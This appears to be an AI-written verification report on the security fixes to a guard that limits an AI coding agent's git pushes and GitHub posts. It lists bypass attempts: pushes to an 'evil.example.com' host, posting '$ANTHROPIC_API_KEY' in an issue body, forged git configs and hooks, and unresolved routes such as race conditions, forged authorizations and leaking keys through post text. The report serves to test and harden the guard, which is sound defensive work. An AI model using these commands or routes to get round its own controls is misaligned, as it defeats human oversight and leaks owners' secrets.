# Verification of the security fixes, unit 0008 (commit ce8674c)

Worktree WT = `.claude/worktrees/agent-a6f142c55e03a21a4`, branch worktree-agent-a6f142c55e03a21a4, HEAD ce8674c. Earlier review: `review-security.md` (same directory).

Suite: `cd WT/harness && python3 -B -m unittest discover -s tests` ran 185 tests, OK, 231 s.

Result: no Critical and no High remains. H1, H2, H3 are closed (each exploit re-run, now referred). The Mediums are closed or reduced to documented residuals listed below. I found no new High.

Method: the same lab as before (real `git init` repositories, real git 2.56, guard `check_call` with a commit grant for `main` at `https://git.example.org/team/work.git` and a post grant). This time the lab repository has a commit, so the positive case `git push origin main` passes (`[]`); a lab without a commit would refer every push and hide regressions. About 130 command variants were run (scripts `/tmp/claude-1000/sec/v1.py`, `v2.py`, and the earlier `t*.py`).

## Re-run of the original exploits

| Finding | Command or setup | Before | Now |
| --- | --- | --- | --- |
| H1 | `git push -o -n https://evil.example.com/x.git main`, `... main -o -n`, `--receive-pack -n`, `--repo -n`, `-o x -n`, `-o -vn`, `--push-option=-n` | `[]` | remote-write (all eight variants) |
| H2 | fake `work/sub/.git/config` (no HEAD), cwd `sub` | `[]`, git used the parent's evil origin | remote-write "the work's own repository is not the one found"; writing that file is history-rewrite |
| H3 | `git push origin main <<EOF` with `$(...)` or backticks in the body | `[]` | remote-write (the line is not plain words) |
| M1 | `./sub/git push origin main`, `/tmp/x/git ...` | `[]` | remote-write "program is named by a path" |
| M2 | `Write`/`echo >` to `work/.git/hooks/pre-push`, `.git/config` | `[]` | history-rewrite; existing non-sample hook, `core.hooksPath`, `alias`, `credential`, `core.fsmonitor`, `core.askpass` refer the push |
| M3 | `gh ... -b "$ANTHROPIC_API_KEY"`, `-F .env`, `-a bob`, `-b '@bob hi'` | `[]` | remote-write for each (`$` is not plain; `-F`, `-a`, `-l` not allowed; `@` refused) |
| L1 to L5 | `-b -x`, `--body=-x` (read as options), `2²`, `gh -R x issue comment`, `gh alias set`, `gh extension install`, `git --namespace x push` | mixed | all remote-write |

## Variants the new rules might still admit (all tried)

Held (referred or correctly passed):
- Option spellings: `--dry-run=x`, `--dry`, `-nv`-style clusters, `-ofoo`, `-oa`, `--push-option=a`, `--quiet=1`, `-vq`, `--no-thin`, `--follow-tags`, `--signed`, `--verify`, `--prune`, `--force-with-lease`, `--force-if-includes`, `--exec=`, `--repo=`, `-C .` after `push`, and every global option before `push` (`-C`, `-c`, `--config-env`, `--namespace`, `--super-prefix`, `--exec-path`, `-p`, `--bare`). `-n` counts as a dry run only beside options that take no value; `git push -n -o x origin main` is not dry and is referred.
- `=` forms, quoting inside the alphabet: `git "push" origin main`, `"git" push ...`, `g"i"t push ...`, `ma'in'`, `main""` give the same words to shell and `shlex` and pass as the plain `git push`; `"--force"` is seen as `--force` and refused; unbalanced quotes are `selective-destruction` (fail closed).
- Refspecs: `v1:main` (tag source), `refs/tags/v1:main`, `main:v1` (tag name), `main:main:main`, `:main`, `+main`, `main*`, `HEAD`, `@`, `main:heads/main`, `main::`, `main:`, `main:refs/heads/dev` (not granted), local `refs/remotes/dev` or `refs/remotes/dev/HEAD` next to branch `dev`. `HEAD:main`, `dev:main`, `refs/heads/main:main` pass because the destination branch is `main`, which is granted.
- Paths: nested valid repository below the work, cwd through a symlink to another repository, cwd outside the work, `.git` replaced by a symlink: all referred. A cwd or work reached through a symlink to the work itself, and plain or symlinked subdirectories of the work, pass, correctly (realpath is used).
- Environment: `GIT_DIR`, `GIT_CONFIG_COUNT`, `GH_REPO` in the guard's environment refer.
- Plain-words rule: `&`, `;`, `|`, newline, `\`, `$`, backtick, `<`, `>`, `#`, `~`, `*`, `?`, `{`, `}`, `(`, `)` anywhere in the command line stop an allow (`git push origin main &` and `main;` are now referred). A permitted `gh` body may hold quotes, `=`, `,`, `+`, `:`, and blanks only.
- Destination strings: `HTTPS://`, trailing `/`, `ssh://` for an https grant, all referred.
- Kept ask rules: `settings()` now keeps `Bash(git push *)` and adds `Bash(gh issue create *)`, `Bash(gh issue comment *)`, `Bash(gh pr comment *)` (checked in the diff of `claude_code.py`; `AUTHORIZED_RULES` is gone). If a hook's allow does not outrank an ask rule, the call is prompted, and in an unattended session refused: closed. A deny rule (Refuse) outranks the allow in Claude Code's order; the guard's own forced/deleting push still reaches history-rewrite. The `allow` answer is returned only when no outcome was reached and the call is one plain command, so it cannot hide another finding. The installation test that decides whether the allow wins is listed as open in the unit record and the README; that is accurate.

## Remaining findings

### Medium

**M-a. A program the guard does not read can change the repository between the check and the push.** The guard reads `.git/config`, the hooks directory, and the refs at the moment of the call. A program started earlier (for example `python3 loop.py &` that swaps `.git/config` or drops a hook, reached by a script because the guard does not read what a launched program writes) can race that check. The coverage text, README, and the record all say so ("not seen: a program started earlier"), so the documentation is truthful; the exposure remains. The write-refusal added for the file tools and shell redirections does not apply to a program's own writes. Fix: when commit authorizations are installed, add `<work>/.git/config`, `<work>/.git/config.worktree`, and `<work>/.git/hooks` to the sandbox's `denyWrite` (git commit and push write only objects, refs, and logs, so they keep working; `git config` and `git remote set-url` then fail inside the sandbox, which is the intent). Test: an installation test that a sandboxed `python3 -c "open('.git/config','a')"` fails.

**M-b. The content of an authorized post is bounded only by the destination.** The body is now literal words with no `$`, `@`, or file, so the agent can no longer expand environment variables, read files, or mention users. It can still type any text it knows (for example a key seen earlier in the session, or a URL carrying data) into a tracker whose subscribers receive it by mail. The record says "the content of a post, which the authorization's destination alone bounds"; accurate. Fix, if wanted: cap body length and refuse text that looks like a token (long base64 or hex runs).

**M-c. Forgery in work without a signer register, and unbounded expiry by default.** A signature is now required wherever a signer register exists or the work is assured, and the command prints, for each authorization, the pinning `seq` and what it opens. Without a register an unsigned `authorize` that an agent appended to the ledger (appends are permitted writes) with a recomputed chain is still accepted; the printed summary is the only control and depends on the owner reading it. `--expiry-horizon` is optional, and `until revoked` is accepted when it is not given. Fix: make the horizon default to a stated bound (for example 90 days) and require `--expiry-horizon none` to lift it; refuse the derivation when no register exists unless `--accept-unsigned` is passed.

### Low

- L-a. `HTTPS_PROXY`, `ALL_PROXY`, `SSH_ASKPASS`, `SSH_AUTH_SOCK`, and the account's `~/.ssh/config` are not checked (only `GIT_*` and `GH_*` variables are). They belong to the owner's account, not to the agent, so I rate this Low; list them in the coverage text as not modelled.
- L-b. `git config`, `git remote set-url`, and `git remote add` are not refused (the new write refusal covers file tools and shell file operations, not git's own subcommands). Their effect is read at the next push, so a rewrite or push URL set that way refers it; an added remote that carries the granted URL passes by design.
- L-c. The guard does not read `dangerouslyDisableSandbox` in the tool input. `allowUnsandboxedCommands` is false in the derived settings, so the call is refused elsewhere; an allow for a plain push does not widen that.
- L-d. `git push -u` writes `.git/config` itself; harmless, noted because the config is otherwise treated as protected.
- L-e. The `.git` file of the work may name a `gitdir:` outside the work (linked worktree). It is accepted when valid and written by the owner, since the agent can no longer write `.git`. Fine; it is a trust in the owner's layout.
- L-f. Credential helpers now always refer (`credential` section is a redirection key), so an owner with `credential.helper` set sees no benefit from a push authorization. Not a security issue; mention in the README.

## Accuracy of the records

- README (environment row and the bullet for remote writes), unit record "Revision after review", decision 0002 adjustments: I found each statement matches the code, including that the ask rules stay, that the allow may be outranked until the installation test, that `-n` is read strictly, that writes into `.git` reach history-rewrite, and that `environment --check` fails for a revoked authorization (the derivation fails).
- One overstatement: the record says L2 (links) "is met by reading paths where their links lead". True for the work and the cwd (realpath); it does not cover a program's later change of a link. Covered by M-a.
- The record says mutation checks were done for H1, H2, H3, and M2 only. I did not re-run the mutations; the added tests exist (185 tests now, up from 175) and the exploits above fail against the fixed code.

## What I could not verify

- Whether a hook's `allow` outranks an ask rule in Claude Code (an installation test, as the record says). The design fails closed either way.
- The race of M-a (nondeterministic; not attempted).
- Whether the Bash tool's environment equals the hook's, and whether exported variables persist between calls.
- Signature verification with a real signer register and gpg.
- The server side (redirects, branch-triggered deployment).
